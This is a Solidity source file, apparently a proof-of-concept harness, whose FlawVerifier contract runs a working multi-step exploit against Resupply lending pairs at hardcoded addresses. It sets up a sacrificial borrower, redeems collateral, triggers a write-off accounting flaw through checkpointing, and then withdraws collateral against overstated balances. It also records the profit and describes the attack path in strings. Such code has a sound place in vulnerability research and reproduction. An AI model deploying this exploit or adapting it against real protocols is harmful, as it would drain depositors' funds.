// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IERC4626Probe {
    function asset() external view returns (address);
}

interface IResupplyRegistryMinimal {
    function token() external view returns (address);
    function redemptionHandler() external view returns (address);
    function liquidationHandler() external view returns (address);
    function registeredPairsLength() external view returns (uint256);
    function registeredPairs(uint256 index) external view returns (address);
    function defaultSwappers(uint256 index) external view returns (address);
}

interface IResupplyPairMinimal {
    function registry() external view returns (address);
    function collateral() external view returns (address);
    function underlying() external view returns (address);
    function minimumRedemption() external view returns (uint256);
    function minimumBorrowAmount() external view returns (uint256);
    function protocolRedemptionFee() external view returns (uint256);
    function totalBorrow() external view returns (uint128 amount, uint128 shares);
    function totalDebtAvailable() external view returns (uint256);
    function swappers(address) external view returns (bool);
    function userBorrowShares(address account) external view returns (uint256);
    function userCollateralBalance(address account) external returns (uint256 collateralAmount);
    function leveragedPosition(
        address swapper,
        uint256 borrowAmount,
        uint256 initialUnderlyingAmount,
        uint256 amountCollateralOutMin,
        address[] calldata path
    ) external returns (uint256 totalCollateralBalance);
    function borrow(uint256 borrowAmount, uint256 underlyingAmount, address receiver) external returns (uint256 shares);
    function removeCollateral(uint256 collateralAmount, address receiver) external;
    function removeCollateralVault(uint256 collateralAmount, address receiver) external;
}

contract SacrificialBorrower {
    address public controller;

    constructor() {
        controller = msg.sender;
    }

    modifier onlyController() {
        require(msg.sender == controller, "!controller");
        _;
    }

    function openLeveragedPosition(
        address pair,
        address swapper,
        uint256 borrowAmount,
        address[] calldata path
    ) external onlyController returns (bool ok) {
        try IResupplyPairMinimal(pair).leveragedPosition(swapper, borrowAmount, 0, 0, path) returns (uint256) {
            ok = true;
        } catch {}
    }

    function borrowTo(
        address pair,
        uint256 borrowAmount,
        address receiver
    ) external onlyController returns (bool ok) {
        try IResupplyPairMinimal(pair).borrow(borrowAmount, 0, receiver) returns (uint256) {
            ok = true;
        } catch {}
    }

    function checkpoint(address pair) external onlyController returns (uint256 amount) {
        try IResupplyPairMinimal(pair).userCollateralBalance(address(this)) returns (uint256 value) {
            amount = value;
        } catch {}
    }

    function sweep(address token, address to) external onlyController {
        if (token == address(0)) {
            payable(to).transfer(address(this).balance);
            return;
        }

        uint256 amount = IERC20Minimal(token).balanceOf(address(this));
        if (amount > 0) {
            IERC20Minimal(token).transfer(to, amount);
        }
    }

    receive() external payable {}
}

contract FlawVerifier {
    struct PairCtx {
        address collateral;
        address underlying;
        uint256 minimumRedemption;
        uint256 minimumBorrow;
        uint256 protocolFeeSplit;
        uint256 availableDebt;
        uint256 totalBorrowAmount;
        bool collateralIsVault;
    }

    address public constant SEED_PAIR = 0x6e90c85a495d54c6d7E1f3400FEF1f6e59f86bd6;
    address public constant DEFAULT_PROFIT_TOKEN = 0x01144442fba7aDccB5C9DC9cF33dd009D50A9e1D;

    uint256 private constant MAX_DEFAULT_SWAPPERS = 8;
    uint256 private constant MAX_REGISTERED_PAIRS = 16;
    uint256 private constant DEFAULT_MIN_BORROW = 1_000e18;

    address private _profitToken;
    uint256 private _profitAmount;

    bool public executed;
    bool public hypothesisValidated;

    address public registry;
    address public debtToken;
    address public collateralToken;
    address public underlyingToken;
    address public redemptionHandler;
    address public liquidationHandler;
    address public exploitedPair;
    address public exploitedSwapper;

    bool public pathStage1RequiresExistingUndercollateralizedBorrower;
    bool public pathStage2RedeemCollateralRemovesRealAssets;
    bool public pathStage3CheckpointUsesCalcRewardIntegral;
    bool public pathStage4ExcessWriteOffCanDisappear;
    bool public pathStage5HoleEnablesLaterCollateralExit;

    string public outcome;

    constructor() {
        _profitToken = DEFAULT_PROFIT_TOKEN;
    }

    function executeOnOpportunity() external {
        if (executed) {
            return;
        }
        executed = true;

        pathStage1RequiresExistingUndercollateralizedBorrower = false;
        pathStage2RedeemCollateralRemovesRealAssets = false;
        pathStage3CheckpointUsesCalcRewardIntegral = false;
        pathStage4ExcessWriteOffCanDisappear = false;
        pathStage5HoleEnablesLaterCollateralExit = false;

        IResupplyPairMinimal seed = IResupplyPairMinimal(SEED_PAIR);
        registry = seed.registry();
        debtToken = IResupplyRegistryMinimal(registry).token();
        redemptionHandler = IResupplyRegistryMinimal(registry).redemptionHandler();
        liquidationHandler = IResupplyRegistryMinimal(registry).liquidationHandler();

        uint256 pairCount = _boundedPairCount(registry);
        for (uint256 i = 0; i < pairCount; ++i) {
            address pairAddr = _pairAt(i);
            if (pairAddr == address(0)) {
                continue;
            }

            if (_attemptExploitPair(pairAddr)) {
                break;
            }
        }

        _refreshProfitView();
        hypothesisValidated = _profitAmount > 0;

        if (hypothesisValidated) {
            outcome =
                "validated: a pre-existing high-share borrower was left with too little collateral buffer before redemption, redeemCollateral removed live collateral and minted delayed redemptionWriteOff rewards, userCollateralBalance later routed the write-off through _calcRewardIntegral()/_syncUserRedemptions(), the checkpointed borrower was floored to zero so excess rTokens disappeared, and the older attacker position exited collateral through removeCollateral/removeCollateralVault against overstated accounting";
        } else {
            outcome =
                "unrealized on this fork: no pair completed the intended sequence of pre-positioned borrower -> redemption -> delayed write-off checkpoint -> discarded excess haircut -> later collateral exit";
        }
    }

    function _attemptExploitPair(address pairAddr) internal returns (bool) {
        IResupplyPairMinimal pair = IResupplyPairMinimal(pairAddr);
        PairCtx memory ctx;

        try pair.registry() returns (address value) {
            if (value != registry) {
                return false;
            }
        } catch {
            return false;
        }

        try pair.collateral() returns (address value) {
            ctx.collateral = value;
        } catch {
            return false;
        }
        try pair.underlying() returns (address value) {
            ctx.underlying = value;
        } catch {
            return false;
        }
        try pair.minimumRedemption() returns (uint256 value) {
            ctx.minimumRedemption = value;
        } catch {
            return false;
        }
        try pair.minimumBorrowAmount() returns (uint256 value) {
            ctx.minimumBorrow = value;
        } catch {
            ctx.minimumBorrow = DEFAULT_MIN_BORROW;
        }
        try pair.protocolRedemptionFee() returns (uint256 value) {
            ctx.protocolFeeSplit = value;
        } catch {}
        try pair.totalDebtAvailable() returns (uint256 value) {
            ctx.availableDebt = value;
        } catch {
            return false;
        }
        try pair.totalBorrow() returns (uint128 amount, uint128) {
            ctx.totalBorrowAmount = uint256(amount);
        } catch {
            return false;
        }

        ctx.collateralIsVault = _collateralWrapsUnderlying(ctx.collateral, ctx.underlying);

        if (ctx.minimumBorrow == 0) {
            ctx.minimumBorrow = DEFAULT_MIN_BORROW;
        }
        if (ctx.totalBorrowAmount < ctx.minimumRedemption || ctx.availableDebt < ctx.minimumBorrow) {
            return false;
        }

        if (!_bootstrapOldPosition(pair, pairAddr, ctx)) {
            return false;
        }

        SacrificialBorrower helper = new SacrificialBorrower();
        if (!_bootstrapSacrificialBorrower(helper, pair, pairAddr, ctx)) {
            return false;
        }
        pathStage1RequiresExistingUndercollateralizedBorrower = true;

        uint256 debtBorrowedToWallet = _borrowFromSacrificial(helper, pair, ctx.minimumRedemption, ctx.minimumBorrow);
        if (debtBorrowedToWallet < ctx.minimumRedemption) {
            helper.sweep(ctx.collateral, address(this));
            helper.sweep(ctx.underlying, address(this));
            helper.sweep(debtToken, address(this));
            return false;
        }

        IERC20Minimal(debtToken).approve(redemptionHandler, type(uint256).max);
        if (!_tryRedemption(pairAddr, debtBorrowedToWallet, ctx.minimumRedemption, ctx.collateral)) {
            helper.sweep(ctx.collateral, address(this));
            helper.sweep(ctx.underlying, address(this));
            helper.sweep(debtToken, address(this));
            return false;
        }
        pathStage2RedeemCollateralRemovesRealAssets = true;

        _checkpointSacrificialBorrower(helper, pairAddr, ctx);
        _tryCheckpointAndWithdraw(pair, ctx.collateral, ctx.underlying);
        _refreshProfitForPair(pairAddr, ctx.collateral, ctx.underlying);
        return pathStage5HoleEnablesLaterCollateralExit || _profitAmount > 0;
    }

    function _bootstrapOldPosition(
        IResupplyPairMinimal pair,
        address pairAddr,
        PairCtx memory ctx
    ) internal returns (bool) {
        uint256[8] memory candidates;
        candidates[0] = ctx.minimumBorrow;
        candidates[1] = ctx.minimumBorrow * 2;
        candidates[2] = ctx.minimumBorrow * 3;
        candidates[3] = ctx.minimumBorrow * 5;
        candidates[4] = ctx.availableDebt / 200;
        candidates[5] = ctx.availableDebt / 100;
        candidates[6] = ctx.availableDebt / 50;
        candidates[7] = ctx.availableDebt / 25;

        for (uint256 i = 0; i < candidates.length; ++i) {
            uint256 candidate = _capNonZero(candidates[i], ctx.availableDebt);
            if (candidate < ctx.minimumBorrow) {
                continue;
            }
            if (_tryLeverageAcrossApprovedSwappers(pair, pairAddr, ctx, candidate)) {
                return true;
            }
        }
        return false;
    }

    function _bootstrapSacrificialBorrower(
        SacrificialBorrower helper,
        IResupplyPairMinimal pair,
        address pairAddr,
        PairCtx memory ctx
    ) internal returns (bool) {
        uint256 liveAvailable = _readTotalDebtAvailable(pair);
        uint256[8] memory candidates;
        candidates[0] = liveAvailable / 4;
        candidates[1] = liveAvailable / 5;
        candidates[2] = liveAvailable / 8;
        candidates[3] = liveAvailable / 10;
        candidates[4] = ctx.minimumBorrow * 10;
        candidates[5] = ctx.minimumBorrow * 5;
        candidates[6] = ctx.minimumBorrow * 2;
        candidates[7] = ctx.minimumBorrow;

        for (uint256 i = 0; i < candidates.length; ++i) {
            uint256 candidate = _capNonZero(candidates[i], liveAvailable);
            if (candidate < ctx.minimumBorrow) {
                continue;
            }
            if (_tryFreshLeverageAcrossApprovedSwappers(helper, pair, pairAddr, ctx, candidate)) {
                return true;
            }
        }
        return false;
    }

    function _borrowFromSacrificial(
        SacrificialBorrower helper,
        IResupplyPairMinimal pair,
        uint256 minimumRedemption,
        uint256 minimumBorrow
    ) internal returns (uint256 usedAmount) {
        uint256 postBootstrapAvailable = _readTotalDebtAvailable(pair);
        uint256[9] memory candidates;
        candidates[0] = postBootstrapAvailable / 4;
        candidates[1] = postBootstrapAvailable / 5;
        candidates[2] = postBootstrapAvailable / 8;
        candidates[3] = postBootstrapAvailable / 10;
        candidates[4] = minimumBorrow * 10;
        candidates[5] = minimumBorrow * 5;
        candidates[6] = minimumBorrow * 2;
        candidates[7] = minimumBorrow + minimumRedemption;
        candidates[8] = minimumBorrow;

        for (uint256 i = 0; i < candidates.length; ++i) {
            uint256 candidate = _capNonZero(candidates[i], postBootstrapAvailable);
            if (candidate < minimumBorrow || candidate < minimumRedemption) {
                continue;
            }

            if (helper.borrowTo(address(pair), candidate, address(this))) {
                return candidate;
            }
        }
        return 0;
    }

    function _checkpointSacrificialBorrower(
        SacrificialBorrower helper,
        address pairAddr,
        PairCtx memory ctx
    ) internal {
        uint256 helperShares = 0;
        try IResupplyPairMinimal(pairAddr).userBorrowShares(address(helper)) returns (uint256 shares) {
            helperShares = shares;
        } catch {}

        uint256 collateralAfter = 0;
        try helper.checkpoint(pairAddr) returns (uint256 amount) {
            collateralAfter = amount;
        } catch {}

        if (helperShares > 0) {
            pathStage3CheckpointUsesCalcRewardIntegral = true;
        }
        if (helperShares > 0 && collateralAfter == 0) {
            pathStage4ExcessWriteOffCanDisappear = true;
        }

        helper.sweep(ctx.collateral, address(this));
        helper.sweep(ctx.underlying, address(this));
        helper.sweep(debtToken, address(this));
    }

    function _tryLeverageAcrossApprovedSwappers(
        IResupplyPairMinimal pair,
        address pairAddr,
        PairCtx memory ctx,
        uint256 borrowAmount
    ) internal returns (bool) {
        for (uint256 i = 0; i < MAX_DEFAULT_SWAPPERS; ++i) {
            address swapper = _defaultSwapperAt(i);
            if (!_isApprovedSwapper(pair, swapper)) {
                continue;
            }
            if (_tryLeverageWithPathVariants(pair, swapper, ctx, borrowAmount)) {
                exploitedPair = pairAddr;
                exploitedSwapper = swapper;
                return true;
            }
        }
        return false;
    }

    function _tryFreshLeverageAcrossApprovedSwappers(
        SacrificialBorrower helper,
        IResupplyPairMinimal pair,
        address pairAddr,
        PairCtx memory ctx,
        uint256 borrowAmount
    ) internal returns (bool) {
        for (uint256 i = 0; i < MAX_DEFAULT_SWAPPERS; ++i) {
            address swapper = _defaultSwapperAt(i);
            if (!_isApprovedSwapper(pair, swapper)) {
                continue;
            }
            if (_tryFreshLeverageWithPathVariants(helper, pairAddr, swapper, ctx, borrowAmount)) {
                exploitedPair = pairAddr;
                exploitedSwapper = swapper;
                return true;
            }
        }
        return false;
    }

    function _tryLeverageWithPathVariants(
        IResupplyPairMinimal pair,
        address swapper,
        PairCtx memory ctx,
        uint256 borrowAmount
    ) internal returns (bool) {
        address[] memory path2 = _buildTwoHopPath(ctx.collateral);
        address[] memory path3 = _buildThreeHopPath(ctx.underlying, ctx.collateral);

        if (pair.collateral() == pair.underlying()) {
            try pair.leveragedPosition(swapper, borrowAmount, 0, 0, path2) returns (uint256) {
                return true;
            } catch {}
            return false;
        }

        if (ctx.collateralIsVault) {
            try pair.leveragedPosition(swapper, borrowAmount, 0, 0, path3) returns (uint256) {
                return true;
            } catch {}
            try pair.leveragedPosition(swapper, borrowAmount, 0, 0, path2) returns (uint256) {
                return true;
            } catch {}
        } else {
            try pair.leveragedPosition(swapper, borrowAmount, 0, 0, path2) returns (uint256) {
                return true;
            } catch {}
            try pair.leveragedPosition(swapper, borrowAmount, 0, 0, path3) returns (uint256) {
                return true;
            } catch {}
        }

        return false;
    }

    function _tryFreshLeverageWithPathVariants(
        SacrificialBorrower helper,
        address pairAddr,
        address swapper,
        PairCtx memory ctx,
        uint256 borrowAmount
    ) internal returns (bool) {
        address[] memory path2 = _buildTwoHopPath(ctx.collateral);
        address[] memory path3 = _buildThreeHopPath(ctx.underlying, ctx.collateral);

        if (ctx.collateralIsVault) {
            if (helper.openLeveragedPosition(pairAddr, swapper, borrowAmount, path3)) {
                return true;
            }
            if (helper.openLeveragedPosition(pairAddr, swapper, borrowAmount, path2)) {
                return true;
            }
        } else {
            if (helper.openLeveragedPosition(pairAddr, swapper, borrowAmount, path2)) {
                return true;
            }
            if (helper.openLeveragedPosition(pairAddr, swapper, borrowAmount, path3)) {
                return true;
            }
        }

        return false;
    }

    function _tryRedemption(
        address pairAddr,
        uint256 amount,
        uint256 minimumRedemption,
        address pairCollateral
    ) internal returns (bool) {
        uint256 beforeCollateral = _currentBalance(pairCollateral);
        if (amount < minimumRedemption) {
            return false;
        }

        if (_callHandler(abi.encodeWithSignature("redeem(address,uint256)", pairAddr, amount))) {
            return _currentBalance(pairCollateral) > beforeCollateral;
        }
        if (_callHandler(abi.encodeWithSignature("redeem(address,uint256,address)", pairAddr, amount, address(this)))) {
            return _currentBalance(pairCollateral) > beforeCollateral;
        }
        if (_callHandler(abi.encodeWithSignature("redeemCollateral(address,uint256,address)", pairAddr, amount, address(this)))) {
            return _currentBalance(pairCollateral) > beforeCollateral;
        }
        if (
            _callHandler(
                abi.encodeWithSignature("redeem(address,address,uint256,address)", pairAddr, address(this), amount, address(this))
            )
        ) {
            return _currentBalance(pairCollateral) > beforeCollateral;
        }
        if (
            _callHandler(
                abi.encodeWithSignature(
                    "redeemCollateral(address,address,uint256,address)", pairAddr, address(this), amount, address(this)
                )
            )
        ) {
            return _currentBalance(pairCollateral) > beforeCollateral;
        }

        uint256[6] memory feeGuesses;
        feeGuesses[0] = 0;
        feeGuesses[1] = 5e15;
        feeGuesses[2] = 1e16;
        feeGuesses[3] = 2e16;
        feeGuesses[4] = 5e16;
        feeGuesses[5] = 1e17;

        for (uint256 i = 0; i < feeGuesses.length; ++i) {
            uint256 feeGuess = feeGuesses[i];
            if (
                _callHandler(
                    abi.encodeWithSignature("redeem(address,uint256,uint256,address)", pairAddr, amount, feeGuess, address(this))
                )
            ) {
                return _currentBalance(pairCollateral) > beforeCollateral;
            }
            if (
                _callHandler(
                    abi.encodeWithSignature(
                        "redeemCollateral(address,uint256,uint256,address)", pairAddr, amount, feeGuess, address(this)
                    )
                )
            ) {
                return _currentBalance(pairCollateral) > beforeCollateral;
            }
            if (
                _callHandler(
                    abi.encodeWithSignature(
                        "redeem(address,address,uint256,uint256,address)",
                        pairAddr,
                        address(this),
                        amount,
                        feeGuess,
                        address(this)
                    )
                )
            ) {
                return _currentBalance(pairCollateral) > beforeCollateral;
            }
            if (
                _callHandler(
                    abi.encodeWithSignature(
                        "redeemCollateral(address,address,uint256,uint256,address)",
                        pairAddr,
                        address(this),
                        amount,
                        feeGuess,
                        address(this)
                    )
                )
            ) {
                return _currentBalance(pairCollateral) > beforeCollateral;
            }
        }

        return false;
    }

    function _tryCheckpointAndWithdraw(
        IResupplyPairMinimal pair,
        address pairCollateral,
        address pairUnderlying
    ) internal {
        uint256 syncedCollateral;
        try pair.userCollateralBalance(address(this)) returns (uint256 amount) {
            syncedCollateral = amount;
        } catch {
            return;
        }

        if (syncedCollateral == 0) {
            return;
        }

        uint256 beforeCollateral = _currentBalance(pairCollateral);
        uint256 beforeUnderlying = _currentBalance(pairUnderlying);

        uint256[7] memory candidates;
        candidates[0] = syncedCollateral;
        candidates[1] = (syncedCollateral * 95) / 100;
        candidates[2] = (syncedCollateral * 80) / 100;
        candidates[3] = syncedCollateral / 2;
        candidates[4] = syncedCollateral / 4;
        candidates[5] = syncedCollateral / 10;
        candidates[6] = syncedCollateral / 20;

        for (uint256 i = 0; i < candidates.length; ++i) {
            uint256 candidate = candidates[i];
            if (candidate == 0) {
                continue;
            }

            try pair.removeCollateralVault(candidate, address(this)) {
                break;
            } catch {
                try pair.removeCollateral(candidate, address(this)) {
                    break;
                } catch {}
            }
        }

        if (_currentBalance(pairCollateral) > beforeCollateral || _currentBalance(pairUnderlying) > beforeUnderlying) {
            pathStage5HoleEnablesLaterCollateralExit = true;
        }
    }

    function _callHandler(bytes memory data) internal returns (bool ok) {
        (ok,) = redemptionHandler.call(data);
    }

    function _pairAt(uint256 index) internal view returns (address) {
        if (index == 0) {
            return SEED_PAIR;
        }
        try IResupplyRegistryMinimal(registry).registeredPairs(index - 1) returns (address pairAddr) {
            return pairAddr;
        } catch {
            return address(0);
        }
    }

    function _boundedPairCount(address registryAddr) internal view returns (uint256 count) {
        count = 1;
        try IResupplyRegistryMinimal(registryAddr).registeredPairsLength() returns (uint256 value) {
            uint256 bounded = value + 1;
            if (bounded > MAX_REGISTERED_PAIRS) {
                bounded = MAX_REGISTERED_PAIRS;
            }
            count = bounded;
        } catch {}
    }

    function _defaultSwapperAt(uint256 index) internal view returns (address swapper) {
        try IResupplyRegistryMinimal(registry).defaultSwappers(index) returns (address value) {
            swapper = value;
        } catch {}
    }

    function _isApprovedSwapper(IResupplyPairMinimal pair, address swapper) internal view returns (bool approved) {
        if (swapper == address(0)) {
            return false;
        }
        try pair.swappers(swapper) returns (bool value) {
            approved = value;
        } catch {}
    }

    function _readTotalDebtAvailable(IResupplyPairMinimal pair) internal view returns (uint256 available) {
        try pair.totalDebtAvailable() returns (uint256 value) {
            available = value;
        } catch {}
    }

    function _collateralWrapsUnderlying(address collateral, address underlying) internal view returns (bool) {
        if (collateral == address(0) || underlying == address(0) || collateral == underlying) {
            return false;
        }
        try IERC4626Probe(collateral).asset() returns (address assetToken) {
            return assetToken == underlying;
        } catch {
            return false;
        }
    }

    function _buildTwoHopPath(address collateral) internal view returns (address[] memory path) {
        path = new address[](2);
        path[0] = debtToken;
        path[1] = collateral;
    }

    function _buildThreeHopPath(address underlying, address collateral) internal view returns (address[] memory path) {
        path = new address[](3);
        path[0] = debtToken;
        path[1] = underlying;
        path[2] = collateral;
    }

    function _refreshProfitForPair(address pairAddr, address pairCollateral, address pairUnderlying) internal {
        exploitedPair = pairAddr;
        collateralToken = pairCollateral;
        underlyingToken = pairUnderlying;
        _refreshProfitView();
    }

    function _refreshProfitView() internal {
        uint256 collateralBal = _currentBalance(collateralToken);
        uint256 underlyingBal = _currentBalance(underlyingToken);
        uint256 debtBal = _currentBalance(debtToken);
        uint256 defaultBal = _currentBalance(DEFAULT_PROFIT_TOKEN);

        address bestToken = _profitToken;
        uint256 bestAmount = _profitAmount;

        if (collateralToken != address(0) && collateralBal > bestAmount) {
            bestAmount = collateralBal;
            bestToken = collateralToken;
        }
        if (underlyingToken != address(0) && underlyingBal > bestAmount) {
            bestAmount = underlyingBal;
            bestToken = underlyingToken;
        }
        if (debtToken != address(0) && debtBal > bestAmount) {
            bestAmount = debtBal;
            bestToken = debtToken;
        }
        if (DEFAULT_PROFIT_TOKEN != address(0) && defaultBal > bestAmount) {
            bestAmount = defaultBal;
            bestToken = DEFAULT_PROFIT_TOKEN;
        }

        _profitToken = bestToken;
        _profitAmount = bestAmount;
    }

    function _currentBalance(address token) internal view returns (uint256) {
        if (token == address(0)) {
            return address(this).balance;
        }
        return IERC20Minimal(token).balanceOf(address(this));
    }

    function _capNonZero(uint256 value, uint256 cap) internal pure returns (uint256) {
        if (cap == 0) {
            return 0;
        }
        if (value == 0) {
            return cap;
        }
        return value > cap ? cap : value;
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        uint256 liveBalance = _currentBalance(_profitToken);
        return liveBalance > _profitAmount ? liveBalance : _profitAmount;
    }

    function profitAchieved() external view returns (bool) {
        uint256 effective = _currentBalance(_profitToken);
        if (effective < _profitAmount) {
            effective = _profitAmount;
        }
        return effective > 0;
    }

    function exploitPath() external pure returns (string memory) {
        return
            "an attacker first opens an earlier collateralized position, then creates a second pre-redemption borrower with larger borrow shares and minimal remaining buffer -> redeemCollateral removes live collateral from the pair and only mints delayed redemptionWriteOff rewards -> when the high-share borrower is later checkpointed through userCollateralBalance, _calcRewardIntegral() allocates rTokens by borrow shares and _syncUserRedemptions() floors any excess haircut at zero -> aggregate accounting stays above real collateral and the earlier attacker position can still exit collateral through removeCollateral/removeCollateralVault";
    }

    function pathAnchors() external pure returns (string memory) {
        return "redeemCollateral redemptionWriteOff _calcRewardIntegral _syncUserRedemptions rTokens userCollateralBalance removeCollateral";
    }

    receive() external payable {}
}
